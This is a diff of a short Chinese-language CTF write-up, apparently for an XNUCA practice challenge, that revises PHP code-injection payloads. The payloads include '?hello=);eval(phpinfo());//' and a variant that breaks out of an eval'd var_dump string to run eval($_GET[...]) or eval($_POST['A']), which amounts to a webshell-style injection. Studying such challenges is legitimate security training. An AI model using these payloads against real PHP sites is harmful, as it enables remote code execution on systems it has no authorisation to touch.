@@ -17,12 +17,13 @@ payload1:
 
 ?hello=);eval(phpinfo());//
 ```
-即 eval("string(21) ");eval($_GET['A']);//""); 
+var_dump($a);后的结果为  `string(22) ");eval($_POST['A']);//" `
+即 `eval("string(21) ");eval($_GET['A']);//""); `
 
 payload2:
 ```
-
+?hello=);eval($_GET[c]&c=phpinfo();
 ```
-
+即 eval("string(17) ");eval($_GET[c]" string(0) "" ");
 # Refference
 + [XNUCA 赛前指导 default](http://218.76.35.74:20131/index2.php)
